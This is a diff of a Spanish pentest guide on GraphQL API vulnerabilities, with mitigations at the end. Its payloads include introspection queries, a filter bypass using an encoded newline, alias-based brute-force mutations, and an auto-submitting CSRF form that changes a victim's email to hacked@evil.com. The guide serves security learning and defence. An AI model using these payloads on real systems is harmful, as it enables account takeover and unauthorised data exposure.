@@ -1,16 +1,12 @@
----
-icon: folder-open
----
-
 # GraphQL API vulnerabilities
 
-### 🧬 ¿Qué es GraphQL?
+## 🧬 ¿Qué es GraphQL?
 
 **GraphQL** es un lenguaje de consultas para APIs desarrollado por Facebook en 2012 y liberado como open source en 2015.
 
 A diferencia de REST (con múltiples endpoints como `/users`, `/posts`), GraphQL utiliza un único endpoint donde el cliente define exactamente qué datos quiere recibir.
 
-#### 🧪 Ejemplo básico
+###  Ejemplo básico
 
 ```graphql
 query {
@@ -34,7 +30,7 @@ Respuesta:
 }
 ```
 
-#### 🧠 Conceptos clave
+###  Conceptos clave
 
 * **Queries**: operaciones de lectura (equivalente a GET)
 * **Mutations**: operaciones de escritura (POST/PUT/DELETE)
@@ -44,23 +40,23 @@ Respuesta:
 
 ***
 
-### ⚠️ Por qué GraphQL es vulnerable
+## ⚠️ Por qué GraphQL es vulnerable
 
 La flexibilidad de GraphQL introduce problemas de seguridad:
 
-#### 💥 Exposición de información
+###  Exposición de información
 
 * Introspection permite ver todo el schema
 * Se pueden descubrir campos ocultos (passwords, tokens)
 * Mensajes de error revelan estructura interna
 
-#### 🔓 Problemas de control de acceso
+###  Problemas de control de acceso
 
 * Falta de autorización a nivel de campo
 * Queries anidadas pueden saltarse controles
 * Mutations sin validación de permisos
 
-#### 💣 Ataques de fuerza bruta
+###  Ataques de fuerza bruta
 
 * Aliasing permite múltiples intentos en una sola petición
 * Rate limiting suele ser por request, no por operación
@@ -68,11 +64,11 @@ La flexibilidad de GraphQL introduce problemas de seguridad:
 
 ***
 
-### 🔍 Ataques de Introspection
+## 🔍 Ataques de Introspection
 
 Introspection permite descubrir toda la API.
 
-#### 🧪 Query completa
+###  Query completa
 
 ```graphql
 query IntrospectionQuery {
@@ -93,7 +89,7 @@ query IntrospectionQuery {
 }
 ```
 
-#### 🧪 Versión simplificada
+###  Versión simplificada
 
 ```graphql
 {
@@ -111,14 +107,14 @@ query IntrospectionQuery {
 }
 ```
 
-#### 🎯 Qué obtiene un atacante
+###  Qué obtiene un atacante
 
 * Queries y mutations disponibles
 * Tipos y campos (incluyendo ocultos)
 * Tipos de entrada y parámetros
 * Relaciones entre objetos
 
-#### 🕵️‍♂️ Query universal (detección)
+###  Query universal (detección)
 
 ```graphql
 query { __typename }
@@ -134,11 +130,11 @@ Si responde:
 
 ***
 
-### 🌐 Descubrimiento de endpoints
+## 🌐 Descubrimiento de endpoints
 
 No siempre están en `/graphql`.
 
-#### 📍 Rutas comunes
+###  Rutas comunes
 
 * `/graphql`
 * `/graphql/v1`
@@ -146,7 +142,7 @@ No siempre están en `/graphql`.
 * `/api/graphql`
 * `/v1/graphql`
 
-#### 🔍 Técnicas
+###  Técnicas
 
 * Probar rutas comunes
 * Buscar respuestas tipo:
@@ -158,9 +154,9 @@ No siempre están en `/graphql`.
 
 ***
 
-### 🧠 Bypass de restricciones de introspection
+## 🧠 Bypass de restricciones de introspection
 
-#### 💥 Bypass con salto de línea
+###  Bypass con salto de línea
 
 ```graphql
 query { __schema%0a{ queryType { name } } }
@@ -168,7 +164,7 @@ query { __schema%0a{ queryType { name } } }
 
 Algunos filtros solo detectan `__schema{`, no `__schema\n{`.
 
-#### 🔄 Alternativa con \_\_type
+###  Alternativa con \_\_type
 
 ```graphql
 {
@@ -180,14 +176,14 @@ Algunos filtros solo detectan `__schema{`, no `__schema\n{`.
 }
 ```
 
-#### 🔍 Sugerencias
+###  Sugerencias
 
 * Algunos servidores sugieren campos válidos
 * Enviar nombres mal escritos para descubrirlos
 
 ***
 
-### 💣 Fuerza bruta con aliasing
+## 💣 Fuerza bruta con aliasing
 
 GraphQL permite alias:
 
@@ -202,7 +198,7 @@ mutation {
 }
 ```
 
-#### ⚠️ Por qué funciona
+###  Por qué funciona
 
 * Cada alias es una operación independiente
 * El rate limiting suele contar requests HTTP
@@ -210,11 +206,11 @@ mutation {
 
 ***
 
-### 🌐 CSRF en GraphQL
+## 🌐 CSRF en GraphQL
 
 Si acepta `application/x-www-form-urlencoded`, puede ser vulnerable:
 
-#### 💣 Petición vulnerable
+###  Petición vulnerable
 
 ```http
 POST /graphql
@@ -223,7 +219,7 @@ Content-Type: application/x-www-form-urlencoded
 query=mutation...&variables={"input":{"email":"hacked@evil.com"}}
 ```
 
-#### 🧪 PoC CSRF
+###  PoC CSRF
 
 ```html
 <form action="https://target.com/graphql/v1" method="POST">
@@ -233,7 +229,7 @@ query=mutation...&variables={"input":{"email":"hacked@evil.com"}}
 <script>document.forms[0].submit();</script>
 ```
 
-#### 🎯 Requisitos para que funcione
+###  Requisitos para que funcione
 
 * Aceptar `application/x-www-form-urlencoded`
 * No validar tokens CSRF
@@ -241,7 +237,7 @@ query=mutation...&variables={"input":{"email":"hacked@evil.com"}}
 
 ***
 
-### 🚨 Vulnerabilidades comunes
+## 🚨 Vulnerabilidades comunes
 
 | Vulnerabilidad        | Ataque                    | Impacto              |
 | --------------------- | ------------------------- | -------------------- |
@@ -255,9 +251,9 @@ query=mutation...&variables={"input":{"email":"hacked@evil.com"}}
 
 ***
 
-### 🛡️ Prevención y mitigación
+## 🛡️ Prevención y mitigación
 
-#### 🚫 Desactivar introspection en producción
+###  Desactivar introspection en producción
 
 ```javascript
 const server = new ApolloServer({
@@ -265,7 +261,7 @@ const server = new ApolloServer({
 });
 ```
 
-#### 🔐 Autorización a nivel de campo
+###  Autorización a nivel de campo
 
 ```javascript
 if (!context.user.isAdmin) {
@@ -273,26 +269,26 @@ if (!context.user.isAdmin) {
 }
 ```
 
-#### ⏱️ Rate limiting por operación
+###  Rate limiting por operación
 
 * Limitar número de queries
 * Limitar aliases
 * Controlar complejidad
 
-#### 📡 Forzar Content-Type
+###  Forzar Content-Type
 
 * Solo aceptar `application/json`
 * Rechazar formularios
 * Usar headers personalizados
 
-#### 🧱 Limitar profundidad y complejidad
+###  Limitar profundidad y complejidad
 
 ```
 maxDepth: 10
 maxComplexity: 1000
 ```
 
-#### 🧪 Validación de entrada
+###  Validación de entrada
 
 * Validar argumentos
 * Usar queries parametrizadas
